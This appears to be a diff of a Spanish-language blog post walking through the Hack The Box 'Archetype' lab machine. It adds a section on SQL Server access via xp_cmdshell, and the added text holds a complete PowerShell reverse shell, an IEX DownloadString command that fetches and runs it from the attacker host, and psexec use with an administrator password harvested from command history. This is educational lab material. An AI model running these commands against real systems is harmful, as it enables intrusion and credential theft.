@@ -136,7 +136,7 @@ arrancaremos con la máquina <em>Archetype</em>. Si no sabes bien de que hablo t
 recomiendo que primero leas la
 <a href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html">entrada anterior</a>.</p>
 <ul>
-<li><strong>máquina:</strong>&nbsp;Archetype</li>
+<li><strong>Máquina:</strong>&nbsp;Archetype</li>
 <li><strong><span class="caps">SO</span>:</strong>&nbsp;Windows</li>
 <li><strong><span class="caps">IP</span>:</strong>&nbsp;10.10.10.27</li>
 </ul>
@@ -179,15 +179,14 @@ con los siguientes&nbsp;parámetros:</p>
 <li><code>-p-</code>: Indicamos que vamos a escanear todos los puertos de la&nbsp;máquina.</li>
 <li><code>--min-rate=1000</code>: Indicamos que enviaremos al menos 1000 paquetes por segundos para realizar el&nbsp;escaneo.</li>
 <li><code>-T4</code>: Indicamos una <em>plantilla de tiempo</em>. Básicamente le decimos a <code>nmap</code>
-que los tiempos haga un <em>análisis agresivo</em>. El modo agresivo hace que los
+que haga un <em>análisis agresivo</em>. El modo agresivo hace que los
 análisis sean más rápidos al asumir que estas en una red razonablemente más
 rápida y&nbsp;fiable.</li>
 <li><code>10.10.10.27</code>: Indicamos la <span class="caps">IP</span> del objetivo, en este caso es la máquina con la que vamos a&nbsp;trabajar.</li>
 </ul>
 <p>La salida del comando anterior nos muestra la lista de puertos abiertos como
 se ve a&nbsp;continuación.</p>
-<div class="highlight"><pre><span></span><code>└──╼ <span class="nv">$nmap</span> -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 <span class="m">10</span>.10.10.27
-Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-08-06 <span class="m">21</span>:35 CDT
+<div class="highlight"><pre><span></span><code>Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-08-06 <span class="m">21</span>:35 CDT
 Warning: <span class="m">10</span>.10.10.27 giving up on port because retransmission cap hit <span class="o">(</span><span class="m">6</span><span class="o">)</span>.
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.27
 Host is up <span class="o">(</span><span class="m">0</span>.088s latency<span class="o">)</span>.
@@ -210,10 +209,10 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 
 
 <p>La salida anterior la pasamos a <code>grep ^[0-9]</code> para que nos muestre solamente
-solamente el listado de puertos sin la información de <code>nmap</code>. Esto se lo
-indicamos a <code>grep</code> utilizando la expresión regular <code>^[0-9]</code> la cual
-especifica que busque las lineas que comienzan con valores numéricos que van
-del 0 al 9. La salida es como se muestra a&nbsp;continuación.</p>
+el listado de lineas donde aparecen puertos, esto para quitar la información
+extra de <code>nmap</code>. Esto se lo indicamos a <code>grep</code> utilizando la expresión regular
+<code>^[0-9]</code> la cual especifica que busque las lineas que comienzan con valores
+numéricos que van del 0 al 9. La salida es como se muestra a&nbsp;continuación.</p>
 <div class="highlight"><pre><span></span><code><span class="m">135</span>/tcp   open  msrpc
 <span class="m">139</span>/tcp   open  netbios-ssn
 <span class="m">445</span>/tcp   open  microsoft-ds
@@ -233,7 +232,7 @@ exclusivamente el número de los puertos abiertos. Esto se lo indicamos a <code>
 con los siguientes&nbsp;parámetros:</p>
 <ul>
 <li><code>-d '/'</code>: Indicamos el carácter delimitador. Esto vendría a ser nuestro
-carácter para <em>separar</em> la cadena en <em>columna</em>, Algo así como la coma <em>,</em> de
+carácter para <em>separar</em> la cadena en <em>columna</em>, Algo así como la coma <code>,</code> de
 un <span class="caps">CSV</span>.</li>
 <li><code>-f 1</code>: Indicamos que retorne o imprima el primer campo de los resultados.
 En este caso si observamos la salida del comando anterior podemos asumir que
@@ -241,7 +240,7 @@ las lineas de texto se van a separar en dos columnas debido a que cada linea
 tiene el carácter <code>/</code>. El primer campo tendrá el número de puerto y el segundo
 campo tendrá la descripción del&nbsp;puerto.</li>
 </ul>
-<p>La salida sel comando anterior es la&nbsp;siguiente:</p>
+<p>La salida del comando anterior es la&nbsp;siguiente:</p>
 <div class="highlight"><pre><span></span><code><span class="m">135</span>
 <span class="m">139</span>
 <span class="m">445</span>
@@ -265,7 +264,7 @@ campo tendrá la descripción del&nbsp;puerto.</li>
 
 <p>La salida anterior la pasamos a <code>sed s/,$//</code> para simplemente extraer la
 ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
-Esto lo hacemos con la expresión <code>s/,$//</code> la cual se pasa a <code>sed</code> y respeta
+Esto lo hacemos con la expresión <code>s/,$//</code> la cual se pasa a <code>sed</code> que respeta
 la sintaxis <code>s/regexp/replacement/flags</code>. La expresión utilizada busca la
 última coma de la linea y la&nbsp;borra.</p>
 <p>La salida del comando anterior es la&nbsp;siguiente:</p>
@@ -367,7 +366,7 @@ y están asociados a dos servicios:
 conectarnos de manera anonima en busqueda de archivos interesantes. Para esto
 recomiendan utilizar <code>smbclient</code> la cual es un cliente de conexiones
 perteneciente al proyecto
-<a href="https://es.wikipedia.org/wiki/Samba_(software)">Samba</a> en sistemas tipo&nbsp;Unix.</p>
+<a href="https://es.wikipedia.org/wiki/Samba_(software)">Samba</a> en sistemas tipo <code>Unix</code>.</p>
 <p>El comando recomendado&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code>smbclient -N -L <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>
 </code></pre></div>
@@ -382,13 +381,11 @@ conectar. En este caso nos estamos conectando desde un sistema tipo <code>Unix</
 sistema basado en <code>DOS</code> por lo cual utilizaremos la sintaxis de
 <code>DOS</code> la cual requiere barras invertidas (<code>\</code>). Al estar en un sistema
 tipo <code>Unix</code> tenemos que escapar la barra invertida con una barra invertida
-(<code>\\\\</code>), por eso al ver al inicio cuatro barras invertidas y dos al inicio, en
+(<code>\\\\</code>), por eso al inicio vemos cuatro barras invertidas y dos al final, en
 realidad la sintaxis de <code>DOS</code> lo tomaría como dos barras al inicio y una al&nbsp;final.</li>
 </ul>
 <p>El resultado del comando anterior&nbsp;es:</p>
-<div class="highlight"><pre><span></span><code>└──╼ <span class="nv">$smbclient</span> -N -L <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>
-
-    Sharename       Type      Comment
+<div class="highlight"><pre><span></span><code>    Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     backups         Disk      
@@ -399,7 +396,7 @@ SMB1 disabled -- no workgroup available
 
 
 <p>Revisando la salida del comando podemos observar que hay una carpeta interesante
-llamada <code>backup</code> la cual podria contener información interesante. Procederemos
+llamada <code>backups</code> la cual podria contener información interesante. Procederemos
 a conectarnos a esa carpeta con el comando&nbsp;recomendado:</p>
 <div class="highlight"><pre><span></span><code>smbclient -N <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>backups
 </code></pre></div>
@@ -454,7 +451,7 @@ directorio en sistemas basados en <code>DOS</code>, este caso, el directorio&nbs
 <code>prod.dtsConfig</code>.</p>
 <p>Los archivos con extensión
 <a href="https://abrirarchivos.info/extension/dtsconfig">.dtsConfig</a>
-son archivos de configuración con sintaxis <code>XML</code> utilizados en para aplicar
+son archivos de configuración con sintaxis <code>XML</code> utilizados para aplicar
 <em>valores de propiedad</em> a los paquetes de
 <em>Servicios de Integración de <span class="caps">SQL</span> Server</em> (<code>SSIS</code>). Por lo cual podemos obtener
 algo de información de este&nbsp;archivo.</p>
@@ -469,10 +466,6 @@ del archivo <code>prod.dtsConfig</code> a nuestro equipo. Con el archivo en nues
 podemos ver su&nbsp;contenido.</p>
 <p>De vuelta a nuestro equipo, podemos utilizar el comando <code>cat prod.dtsConfig</code> el
 cual nos arrojara el contenido del&nbsp;archivo.</p>
-<div class="highlight"><pre><span></span><code>└──╼ <span class="nv">$cat</span> prod.dtsConfig
-</code></pre></div>
-
-
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;DTSConfiguration&gt;</span>
     <span class="nt">&lt;DTSConfigurationHeading&gt;</span>
         <span class="nt">&lt;DTSConfigurationFileInfo</span> <span class="na">GeneratedBy=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedFromPackageName=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedFromPackageID=</span><span class="s">&quot;...&quot;</span> <span class="na">GeneratedDate=</span><span class="s">&quot;20.1.2019 10:01:34&quot;</span><span class="nt">/&gt;</span>
@@ -489,13 +482,358 @@ cual nos arrojara el contenido del&nbsp;archivo.</p>
 </code></pre></div>
 
 
-<p>La cadena anterior corresponde a la cadena para una conexión <span class="caps">SQL</span> asociada al
-usuario <code>ARCHETYPE\sql_svc</code> y su contraseña que es <code>M3g4c0rp123</code>.</p>
+<p>La cadena anterior corresponde a la cadena para una conexión <code>SQL</code> asociada al
+usuario <code>ARCHETYPE\sql_svc</code> (de <code>Windows</code>) y su contraseña que es <code>M3g4c0rp123</code>.</p>
 <h2>Foothold</h2>
 <p>Ya tenemos un usuario y contraseña, por lo que podemos intentar dar un primer
 paso firme hacia nuestra máquina objetivo &#8230; peeeeero, eso será después porqué
 en este momento necesito dejar el post pausado una vez más y conectarme a hacer
 algunos pendientes del trabajo&nbsp;:)</p>
+<hr>
+<p><strong>Continuación:&nbsp;2020-11-06</strong></p>
+<p>Ola k ase &#8230; bueno, ya pasaron casi tres meses de que comencé a escribir este
+texto y pues apenas vamos a darle un cierre haha en realidad hubo muchas cosas
+que se escribieron en este tiempo pero algunas las borre sin querer y otras
+estan a medias esperando a ser publicada, en fin, continuemos con lo que toca&nbsp;aquí.</p>
+<p>Bien, ya hemos obtenido un usuario y contraseña para una conexión de
+<code>SQL Server</code> de un usuario de <code>Windows</code>, hay que tener en cuenta que aunque el
+usuario es de <code>Windows</code> la configuración de permisos puede ser diferente dentro de
+<code>SQL Server</code> que en <code>Windows</code></p>
+<p>Para conectar a <code>SQL Server</code> podemos utilizar <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> el cual es una colección de clases en <code>Python</code> para
+trabajar con protocolos de&nbsp;red.</p>
+<p>Para obtener <code>impacket</code> necesitamos clonarlo de su repositorio de <code>GitHub</code> ya
+que no viene instalado por defecto en nuestro sistema. Clonamos el&nbsp;repo.</p>
+<div class="highlight"><pre><span></span><code>git clone https://github.com/SecureAuthCorp/impacket.git
+</code></pre></div>
+
+
+<p><code>impacket</code> cuenta con algunos scripts de ejemplo en la carpeta <code>/examples</code>, de
+ahí podemos utilizar <code>mssqlclient.py</code> el cual sirve para realizar conexiones a
+servidores de <code>SQL Server</code>.</p>
+<p>El comando recomendado&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth<span class="sb">`</span>
+</code></pre></div>
+
+
+<p>Pero en nuestro caso utilizaremos el&nbsp;siguiente:</p>
+<div class="highlight"><pre><span></span><code>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+</code></pre></div>
+
+
+<p>Como podemos ver, hemos mandado <code>mssqlclient.py</code> directamente a la entrada de
+<code>Python3</code>, y hemos indicado las&nbsp;banderas:</p>
+<ul>
+<li><code>ARCHETYPE/sql_svc</code>: es el&nbsp;usuario.</li>
+<li><code>@10.10.10.27</code>: es el host o equipo a&nbsp;conectarnos.</li>
+<li><code>-windows-auth</code>: indicamos que nos vamos a autenticar con las credenciales de <code>Windows</code>.</li>
+</ul>
+<p>Al introducir el comando nos va a solicitar la contraseña del usuario, la
+obtuvimos anteriormente (<code>M3g4c0rp123</code>). Se realizará la conexión y se nos
+habilitará una terminal de <code>SQL</code>.</p>
+<div class="highlight"><pre><span></span><code>Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+Password:
+<span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: <span class="m">4096</span>, New Value: <span class="m">16192</span>
+<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line <span class="m">1</span>: Changed database context to <span class="s1">&#39;master&#39;</span>.
+<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line <span class="m">1</span>: Changed language setting to us_english.
+<span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> <span class="m">3232</span><span class="o">)</span>
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+SQL&gt;
+</code></pre></div>
+
+
+<p>Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
+permisos de administrador. Para esto podemos utilizar la función
+<a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15">IS_SRVROLEMEMBER</a>
+la cual nos permite saber si un inicio de sesión de <code>SQL Server</code> es miembro
+de un rol especifico del&nbsp;servidor.</p>
+<p>La sintaxis de la función&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code><span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span> <span class="s1">&#39;role&#39;</span> <span class="p">[</span> <span class="p">,</span> <span class="s1">&#39;login&#39;</span> <span class="p">]</span> <span class="p">)</span>
+</code></pre></div>
+
+
+<p>En la cual tenemos dos&nbsp;argumentos:</p>
+<ul>
+<li><code>role</code>: indicamos el rol a revisar que puede ser alguno de los siguientes.<ul>
+<li>sysadmin</li>
+</ul>
+</li>
+<li>serveradmin</li>
+<li>dbcreator</li>
+<li>setupadmin</li>
+<li>bulkadmin</li>
+<li>securityadmin</li>
+<li>diskadmin<ul>
+<li>public</li>
+<li>processadmin</li>
+</ul>
+</li>
+<li><code>login</code>: es el nombre del servidor <code>SQL</code> a revisar, por defecto su valor es
+    <code>NULL</code> y toma como referencia el servidor en el que hemos iniciado&nbsp;sesión.</li>
+</ul>
+<p>Explicado lo anterior, en nuestra sesión de <code>SQL Server</code> uitlizaremos el
+siguiente&nbsp;comando:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+
+<p>Su salida&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-----------   </span>
+
+          <span class="mi">1</span>
+</code></pre></div>
+
+
+<p>El cual nos da como salida un valor numérico de <code>1</code> el cual representa que el
+la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
+<code>sysadmin</code> en el <code>SQL Server</code>.</p>
+<p>Como tenemos permisos de administrador podemos utilizar algunas herramientas de
+configuración del servidor <code>SQL</code> para habilitar una conexión&nbsp;remota.</p>
+<p>Para esto podemos utilizar <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15">sp_configure</a>
+el cual nos permite modificar configuraciones globales del&nbsp;servidor.</p>
+<p>Su sintaxis es la&nbsp;siguiente:</p>
+<div class="highlight"><pre><span></span><code><span class="n">sp_configure</span> <span class="p">[</span> <span class="o">@</span><span class="n">configname</span><span class="o">=</span> <span class="p">]</span> <span class="s1">&#39;hadoop connectivity&#39;</span><span class="p">,</span>
+             <span class="p">[</span> <span class="o">@</span><span class="n">configvalue</span> <span class="o">=</span> <span class="p">]</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">3</span> <span class="o">|</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">5</span> <span class="o">|</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">7</span>
+</code></pre></div>
+
+
+<p>Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
+El valor depende directamente de la configuración que estamos modificando. Una
+vez que hemos cambiado alguna configuración es necesario utilizar <code>reconfigure;</code>
+para que se apliquen los&nbsp;cambios.</p>
+<p>Si ejecutamos <code>sp_configure;</code> podemos ver una lista de configuraciones
+disponibles, sin embargo estamos buscando una que nos permita habilitar una
+conexión remota. Para esto habilitaremos que se muestren las opciones&nbsp;avanzadas.</p>
+<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;Show Advanced Options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">SQL</span><span class="o">&gt;</span> <span class="n">reconfigure</span><span class="p">;</span>
+</code></pre></div>
+
+
+<p>Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
+configuración llamada <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a>
+la cual nos permite invocar una terminal de comandos de Windows y enviarle una
+cadena a&nbsp;ejecutar.</p>
+<div class="highlight"><pre><span></span><code><span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="n">reconfigure</span><span class="p">;</span>
+</code></pre></div>
+
+
+<p>Ya habilitamos la configuración para utilizar <code>xp_cmdshell</code>, podemos verificar
+los permisos o alcance de nuestra cuenta dentro de <code>Windows</code> utilizando el
+comando <code>whoami</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="n">xp_cmdshell</span> <span class="ss">&quot;whoami&quot;</span>
+</code></pre></div>
+
+
+<p>Su salida&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code><span class="k">output</span>                                                                             
+
+<span class="c1">--------------------------------------------------------------------------------   </span>
+
+<span class="n">archetype</span><span class="err">\</span><span class="n">sql_svc</span>                                                                  
+
+<span class="k">NULL</span>                                                                               
+</code></pre></div>
+
+
+<p>Podemos observar que se nos vuelve a desplegar el usuario <code>archetype\sql_svc</code>,
+esto significa que <code>SQL Server</code> esta corriendo con ese usuario dentro de
+<code>Ẁindows</code>, y podemos ver un <code>NULL</code> lo cual significa que no tiene permisos de&nbsp;administrador.</p>
+<p>Necesitamos una mejor terminal. Intentemos crear una reverse shell mediante
+<code>PowerShell</code>. Para esto podemos utilizar el siguiente&nbsp;código:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;10.10.14.3&quot;</span>,443<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, <span class="m">0</span>, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne <span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&quot;# &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
+</code></pre></div>
+
+
+<p>La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
+llamar al archivo <code>shell.ps1</code>.</p>
+<p>Ahora que lo hemos guardado en un archivo, solo por no dejar, vamos a expandir
+la linea anterior, simplemente queremos que se vea un poco mejor lo que&nbsp;hace.</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;10.10.14.3&quot;</span>,443<span class="o">)</span><span class="p">;</span>
+<span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span>
+<span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span>
+<span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, <span class="m">0</span>, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne <span class="m">0</span><span class="o">){</span><span class="p">;</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span>
+    <span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&quot;# &quot;</span><span class="p">;</span>
+    <span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span>
+    <span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span>
+<span class="nv">$client</span>.Close<span class="o">()</span>
+</code></pre></div>
+
+
+<p>Si observamos, estamos viendo que se crea una conexión a la <span class="caps">IP</span> y el puerto
+especificado, se crea un stream de datos y a partir de aquí se codifica la
+información para poder enviarla a través de la conexión a una terminal&nbsp;remota.</p>
+<p>Recuerden cambiar la dirección <span class="caps">IP</span> al de su equipo. Si no conoces tu dirección
+puedes utilizar el siguiente&nbsp;comando:</p>
+<div class="highlight"><pre><span></span><code>ip addr
+</code></pre></div>
+
+
+<p>Con la <span class="caps">IP</span> indicada y el archivo creado, desde la terminal nos dirigimos a la
+carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
+nuestro equipo al servidor <code>SQL</code> donde nos conectamos para poder ejecutarlo ahí
+y crear la reverse&nbsp;shell.</p>
+<p>Para esto, vamos a hacer los siguientes&nbsp;pasos:</p>
+<ul>
+<li>Levantaremos un servidor <code>HTTP</code> del cual descargaremos el&nbsp;archivo</li>
+<li>Configuramos los puertos de escucha para nuestra conexión de la reverse&nbsp;shell</li>
+<li>Configuraremos el firewall para aceptar las dos conexiones&nbsp;anteriores</li>
+</ul>
+<p>El primer punto lo haremos utilizando el interprete de <code>python</code>, con el cual
+podemos utilizar la clase <code>http.server</code> e indicarle el puerto de escucha.
+Recuerda que necesitar estar en la carpeta donde guardaste el archivo <code>shell.ps1</code>.</p>
+<div class="highlight"><pre><span></span><code>python3 -m http.server <span class="m">80</span>
+</code></pre></div>
+
+
+<p>El segundo punto lo podemos hacer utilizando <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>
+la cual es una herramienta para leer o escribir conexiones de red sobre <span class="caps">TCP</span> o <span class="caps">UDP</span>.</p>
+<p>El comando a utilizar&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">443</span>
+</code></pre></div>
+
+
+<p>Los parámetros de <code>netcat</code> son los&nbsp;siguientes:</p>
+<ul>
+<li><code>l</code>: modo de escucha, para conexiones&nbsp;entrantes</li>
+<li><code>v</code>: modo <code>verbose</code>, para ir viendo que&nbsp;sucede</li>
+<li><code>n</code>: para trabajar con direcciones <span class="caps">IP</span></li>
+<li><code>p</code>: para indicar el puerto donde estará escuchando la conexión, que es el&nbsp;443</li>
+</ul>
+<p>Para el tercer punto utilizaremos <a href="https://wiki.debian.org/Uncomplicated%20Firewall%20%28ufw%29">ufw</a>
+el cual es un firewall con el que vamos a gestionar los&nbsp;puertos.</p>
+<p>El comando a utilizar&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code>ufw allow from <span class="m">10</span>.10.10.27 proto tcp to any port <span class="m">80</span>,443
+</code></pre></div>
+
+
+<p>Con sus comando estamos indicando que permita (<code>allow</code>) conexiones desde (<code>from</code>)
+la dirección <span class="caps">IP</span> <code>10.10.10.27</code> que es la que estamos atacando mediante el protocolo
+<code>TCP</code> (<code>proto tcp</code>) a los puertos 80 y 443 (<code>to any port 80,443</code>).</p>
+<p>Ahora, regresemos a nuestra terminal de <code>SQL</code>, ahi vamos a utilizar la herramienta
+<code>xp_cmdshell</code> que utilizamos previamente, ahora invocaremos una conexión a nuestro
+servidor <code>HTTP</code> local que nos permita descargar la reverse shell y ejecutarla.
+Al ejecutar la reverse shell se creara una conexión a nuestro equipo que sera
+aceptada por <code>netcat</code> y desde ahi ya podremos utilizar la reverse&nbsp;shell.</p>
+<p>El comando a utilizar&nbsp;es:</p>
+<div class="highlight"><pre><span></span><code>xp_cmdshell <span class="s2">&quot;powershell &quot;</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\&quot;</span>http://10.10.14.3/shell.ps1<span class="se">\&quot;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+
+<p>Recuerda actualizar tu dirección <span class="caps">IP</span> en el comando&nbsp;anterior.</p>
+<p>Ya tenemos una reverse shell al usuario en <code>Windows</code>, podemos proceder a extraer
+la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
+con el comando <code>cd</code> e indicar la&nbsp;ruta.</p>
+<div class="highlight"><pre><span></span><code><span class="err">cd C:\Users\sql_svc\Desktop</span>
+</code></pre></div>
+
+
+<p>Aquí podemos ver que se encuentra el archivo <code>user.txt</code> el cual contiene la&nbsp;bandera.</p>
+<div class="highlight"><pre><span></span><code><span class="o">#</span> <span class="n">dir</span>
+
+
+    <span class="n">Directory</span><span class="p">:</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">sql_svc</span><span class="err">\</span><span class="n">Desktop</span>
+
+
+<span class="k">Mode</span>                <span class="n">LastWriteTime</span>         <span class="k">Length</span> <span class="n">Name</span>                                                                  
+<span class="c1">----                -------------         ------ ----                                                                  </span>
+<span class="o">-</span><span class="n">ar</span><span class="c1">---        2/25/2020   6:37 AM             32 user.txt                                                              </span>
+</code></pre></div>
+
+
+<p>Le podemos aplicar un <code>type</code> o un <code>cat</code> al archivo y listo! Tenemos la primer&nbsp;bandera.</p>
+<h2>Privilege&nbsp;Escalation</h2>
+<p>Ya obtuvimos la bandera a nivel de usuario, ahora necesitamos obtener la bandera
+a nivel&nbsp;administrador.</p>
+<p>Sabemos que la cuenta en la que nos encontramos no tiene permisos de administrador
+pero que se utiliza como una cuenta para gestionar servicios, esto significa
+que en algún momento cuando se levantan los servicios se aplica algún permiso
+de administrador. Para conocer en que momento sucede podemos revisar el historial
+de comandos de <code>PowerShell</code>. Para esto podemos utilizar el siguiente&nbsp;comando:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
+</code></pre></div>
+
+
+<p>La salida del comando anterior nos muestra lo&nbsp;siguiente:</p>
+<div class="highlight"><pre><span></span><code>net.exe use T: <span class="se">\\</span>Archetype<span class="se">\b</span>ackups /user:administrator MEGACORP_4dm1n!!
+</code></pre></div>
+
+
+<p>Con lo anterior podemos observar que el disco <code>backups</code> que encontramos al
+conectarnos por <code>SMB</code> fue mapeado con una cuenta local de administrador, y
+ahora tenemos su&nbsp;contraseña.</p>
+<p>Para conectarnos utlizaremos una versión de <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> incluida en <code>impacket</code>.</p>
+<p>De igual manera que el comando de <code>mssqlclient</code> lo invocaremos a traves del
+interprete de <code>Python</code>.</p>
+<div class="highlight"><pre><span></span><code>python3 psexec.py administrator@10.10.10.27
+</code></pre></div>
+
+
+<p>Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
